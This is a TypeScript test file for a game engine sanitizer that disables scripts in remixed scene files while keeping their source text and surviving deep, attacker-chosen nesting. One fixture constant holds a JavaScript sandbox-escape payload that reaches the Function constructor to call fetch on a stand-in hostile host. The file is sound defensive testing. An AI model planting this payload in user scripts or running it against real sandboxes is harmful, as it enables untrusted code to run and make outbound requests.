import { describe, it, expect } from 'vitest';
import { quarantineRemixedScripts } from '../remixSanitizer';

/**
 * Shape mirrors what `engine/src/core/scene_file.rs` serializes: a `SceneFile`
 * with `entities: Vec<EntitySnapshot>`, each snapshot carrying an optional
 * `scriptData` (camelCase, per the `serde(rename_all)` on both structs).
 */
function scene(entities: unknown[]): Record<string, unknown> {
  return {
    formatVersion: 1,
    metadata: { name: 'Test Scene', createdAt: '', modifiedAt: '' },
    entities,
  };
}

const HOSTILE = "(0).constructor.constructor('return fetch')()('https://evil.test')";

describe('quarantineRemixedScripts', () => {
  it('disables an enabled script and reports it', () => {
    const input = scene([
      { id: 1, name: 'Player', scriptData: { source: HOSTILE, enabled: true } },
    ]);

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(1);
    const out = sceneData as typeof input;
    const entities = out.entities as Array<{ scriptData: { source: string; enabled: boolean } }>;
    expect(entities[0].scriptData.enabled).toBe(false);
  });

  it('preserves the source text — this is a quarantine, not a scrub', () => {
    const input = scene([{ id: 1, scriptData: { source: HOSTILE, enabled: true } }]);

    const { sceneData } = quarantineRemixedScripts(input);

    const entities = (sceneData as typeof input).entities as Array<{
      scriptData: { source: string };
    }>;
    expect(entities[0].scriptData.source).toBe(HOSTILE);
  });

  it('preserves sibling fields on the script payload', () => {
    const input = scene([
      { id: 1, scriptData: { source: 'x', enabled: true, template: 'platformer' } },
    ]);

    const { sceneData } = quarantineRemixedScripts(input);

    const entities = (sceneData as typeof input).entities as Array<{
      scriptData: Record<string, unknown>;
    }>;
    expect(entities[0].scriptData).toEqual({ source: 'x', enabled: false, template: 'platformer' });
  });

  it('disables every script in a multi-entity scene', () => {
    const input = scene([
      { id: 1, scriptData: { source: 'a', enabled: true } },
      { id: 2, name: 'no script here' },
      { id: 3, scriptData: { source: 'b', enabled: true } },
      { id: 4, scriptData: { source: 'c', enabled: true } },
    ]);

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(3);
    const entities = (sceneData as typeof input).entities as Array<{
      scriptData?: { enabled: boolean };
    }>;
    expect(entities.map((e) => e.scriptData?.enabled)).toEqual([false, undefined, false, false]);
  });

  it('does not double-count a script that was already disabled', () => {
    const input = scene([
      { id: 1, scriptData: { source: 'a', enabled: false } },
      { id: 2, scriptData: { source: 'b', enabled: true } },
    ]);

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(1);
    const entities = (sceneData as typeof input).entities as Array<{
      scriptData: { enabled: boolean };
    }>;
    expect(entities.map((e) => e.scriptData.enabled)).toEqual([false, false]);
  });

  it('treats a missing `enabled` as something to neutralise, not to trust', () => {
    const input = scene([{ id: 1, scriptData: { source: 'a' } }]);

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(1);
    const entities = (sceneData as typeof input).entities as Array<{
      scriptData: { enabled: boolean };
    }>;
    expect(entities[0].scriptData.enabled).toBe(false);
  });

  it('never mutates the caller\'s object — the source project row must survive intact', () => {
    const scriptData = { source: HOSTILE, enabled: true };
    const input = scene([{ id: 1, scriptData }]);
    const before = JSON.parse(JSON.stringify(input));

    quarantineRemixedScripts(input);

    expect(input).toEqual(before);
    expect(scriptData.enabled).toBe(true);
  });

  it('returns the input by reference when there is nothing to quarantine', () => {
    const input = scene([{ id: 1, name: 'Cube' }]);

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(0);
    expect(sceneData).toBe(input);
  });

  it('finds a script nested below the top-level entity list', () => {
    const input = {
      formatVersion: 1,
      entities: [
        {
          id: 1,
          children: [{ id: 2, scriptData: { source: HOSTILE, enabled: true } }],
        },
      ],
    };

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(1);
    const nested = (sceneData as typeof input).entities[0].children[0];
    expect(nested.scriptData.enabled).toBe(false);
  });

  it('leaves a non-script field named `scriptData` alone', () => {
    // Keyed on the ScriptData shape, not the key name: a string is not a script.
    const input = scene([{ id: 1, scriptData: 'legacy-string-form' }]);

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(0);
    expect(sceneData).toBe(input);
  });

  it('leaves an asset entry that happens to carry a `source` string alone', () => {
    // AssetMetadata-shaped values must not acquire an `enabled: false` field.
    const input = {
      formatVersion: 1,
      assets: { tex1: { source: 'https://cdn.test/a.png', kind: 'texture' } },
      entities: [],
    };

    const { sceneData, quarantined } = quarantineRemixedScripts(input);

    expect(quarantined).toBe(0);
    expect(sceneData).toBe(input);
  });

  it.each([null, undefined, 42, 'not a scene', true])(
    'passes non-object input (%p) straight through',
    (input) => {
      expect(quarantineRemixedScripts(input)).toEqual({ sceneData: input, quarantined: 0 });
    }
  );

  it('does not blow the stack on hostile nesting', () => {
    // A publisher controls sceneData, so depth is attacker-chosen. 100k levels
    // would overflow a recursive walk; the traversal must survive it.
    let deep: unknown = { scriptData: { source: HOSTILE, enabled: true } };
    for (let i = 0; i < 100_000; i += 1) deep = { child: deep };

    expect(() => quarantineRemixedScripts(deep)).not.toThrow();
  });

  it('stops descending past the depth cap rather than walking forever', () => {
    // 65 wrappers puts the script one level below MAX_DEPTH (64).
    let deep: unknown = { scriptData: { source: HOSTILE, enabled: true } };
    for (let i = 0; i < 65; i += 1) deep = { child: deep };

    const { quarantined } = quarantineRemixedScripts(deep);

    expect(quarantined).toBe(0);
  });

  it('quarantines a script sitting just inside the depth cap', () => {
    let deep: unknown = { scriptData: { source: HOSTILE, enabled: true } };
    for (let i = 0; i < 3; i += 1) deep = { child: deep };

    const { quarantined } = quarantineRemixedScripts(deep);

    expect(quarantined).toBe(1);
  });
});
